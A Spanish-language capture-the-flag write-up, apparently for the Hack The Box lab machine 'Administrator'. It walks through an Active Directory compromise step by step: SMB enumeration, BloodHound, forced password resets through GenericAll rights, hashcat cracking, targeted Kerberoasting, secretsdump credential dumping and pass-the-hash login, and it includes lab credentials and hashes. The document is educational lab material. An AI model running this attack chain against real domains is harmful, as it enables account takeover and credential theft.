---
title: "Administrator"
date: "2025-04-19T00:04:43-05:00"
type: "maquinas"
draft: false
tags: ["Bloodhund", "Dumping-de-credenciales", "Windows"]
---

# Enumeración

```python
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.42 -oG allPorts
```

<a href="https://imgur.com/Y1sQo1p"><img src="https://i.imgur.com/Y1sQo1p.png" title="source: imgur.com" /></a>

```python
nmap -sCV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,59464,59475,59480,59483,59502,64101 10.10.11.42 -oN target
```

<a href="https://imgur.com/DPfrAdf"><img src="https://i.imgur.com/DPfrAdf.png" title="source: imgur.com" /></a>

Con cualquiera de los siguientes dos comandos podemos identificar de diferentes maneras los usuarios que hay en la máquina.

```python
crackmapexec smb 10.10.11.42 -u 'Olivia' -p 'ichliebedich' -d Administrator.htb --rid-brute
```

<a href="https://imgur.com/l7E7WMB"><img src="https://i.imgur.com/l7E7WMB.png" title="source: imgur.com" /></a>

```python
nxc smb 10.10.11.42 -u Olivia -p ichliebedich --users
```

<a href="https://imgur.com/HdlR3Pq"><img src="https://i.imgur.com/HdlR3Pq.png" title="source: imgur.com" /></a>

Vamos a listar las configuraciones y los protocolos que se aplican a la máquina con el comando:

```python
nxc smb 10.10.11.42 -u olivia -p ichliebedich --pass-pol
```

<a href="https://imgur.com/hUsqrXp"><img src="https://i.imgur.com/hUsqrXp.png" title="source: imgur.com" /></a>

La enumeración de la política de contraseñas muestra que la longitud mínima de la contraseña es de 7 caracteres, la complejidad de la contraseña está desactivada (lo que significa que los usuarios pueden elegir contraseñas cortas y débiles) y, lo más importante, la opción **Account Lockout Threshold** está desactivada, lo que significa que podemos forzar la cuenta sin temer que se quede bloqueada.

# Bloodhund

Vamos a usar una herramienta llamada BloodHound que nos va a ayudar a encontrar vulnerabilidades para saltar de un usuario a otro y, finalmente, hacer el escalamiento de privilegios. Para instalarla y configurarla, sigue este paso a paso https://www.kali.org/tools/bloodhound/.

```python
bloodhound-python -u olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb -c all
```

<a href="https://imgur.com/pFAuSUQ"><img src="https://i.imgur.com/pFAuSUQ.png" title="source: imgur.com" /></a>

Después de subir los archivos que nos generó el comando y buscar al usuario al cual tenemos acceso, podemos ver que en Outbound Object Control tenemos la opción de saltar a otro usuario, en este caso michael@administrator.htb, y de este a benjamin@administrator.htb.

Dado esto, vemos que tenemos privilegios **GenericAll**, lo que nos permite realizar un **Force Change Password**, que es lo que vamos a intentar.

```python
net rpc password michael "newpass" -U administrator.htb/olivia%ichliebedich -S administrator.htb

pth-net rpc password michael "newpass" -U administrator.htb/Olivia%ffffffffffffffffffffffffffffffff:FBAA3E2294376DC0F5AEB6B41FFA52B7 -S administrator.htb

```

> El hash FBAA3E2294376DC0F5AEB6B41FFA52B7 salió de pasarle la contraseña de Olivia a este algoritmo de hash https://www.browserling.com/tools/ntlm-hash
> 

Con esto, hemos cambiado la contraseña de Michael y procederemos a saltar al usuario Benjamin, lo cual sigue el mismo proceso, pero cambiando las credenciales.

```python
net rpc password benjamin "newpass" -U administrator.htb/michael%"passmichael" -S administrator.htb

pth-net rpc password benjamin 11030221 -U administrator.htb/michael%ffffffffffffffffffffffffffffffff:"hashmichael" -S administrator.htb
```

Luego de esto, nos vamos a conectar por FTP como Benjamin y descargar un archivo que está en el directorio en el que ingresamos con el comando get.

```python
ftp 10.10.11.42@benjamin

get Backup.psafe3
```

## User

Si investigamos un poco, nos daremos cuenta de que es un hash y que lo podemos descifrar con Hashcat.

```python
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlist/rockyou.txt --force
```

<a href="https://imgur.com/wCTdbYB"><img src="https://i.imgur.com/wCTdbYB.png" title="source: imgur.com" /></a>

Con la contraseña que nos dejó el hash, vamos a abrir el psafe3.

```python
pwsafe Backup.psafe3
```

Con las contraseñas del archivo podemos ingresar como emily para obtener la flag de usuario.

# Root

En BloodHound vemos que el único de los tres usuarios que conseguimos puede hacer algo, y ese es Emily. Entonces, vamos a seguir lo que nos dice para un Targeted Kerberoast aunque tambien lo podriamos hacer con Netexec.

<a href="https://imgur.com/6GFAwEU"><img src="https://i.imgur.com/6GFAwEU.png" title="source: imgur.com" /></a>

```python
faketime "$(ntpdate -q administrator.htb | cut -d ' ' -f 1,2)" python3 targetedKerberoast.py -v -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb

faketime "$(ntpdate -q administrator.htb | cut -d ' ' -f 1,2)" nxc ldap 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --kerberoasting output.txt
```

Esto nos deja un hash Kerberos 5 que podemos descifrar con Hashcat, y esa contraseña es la de Ethan.

```python
hashcat -m13100 output.txt /usr/share/wordlist/rockyou.txt
```

Si miramos a qué grupos pertenece en BloodHound, podemos ver que pertenece al grupo de Domain Controllers.

<a href="https://imgur.com/BddMNu2"><img src="https://i.imgur.com/BddMNu2.png" title="source: imgur.com" /></a>

Si buscamos durante un rato, podemos encontrar que podemos escalar privilegios mediante un Credential Dumping https://redcanary.com/threat-detection-report/techniques/os-credential-dumping/, y lo podemos hacer con alguno de los siguientes comandos:

```python
impacket-secretsdump -dc-ip 10.10.11.42 administrator.htb/ethan:limpbizkit@10.10.11.42
```

Esto nos va a mostrar los hashes de todos los usuarios, pero el que nos interesa es el del usuario Administrator. Entonces, con ese hash, vamos a iniciar sesión.

```python
evil-winrm -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e -i 10.10.11.42
```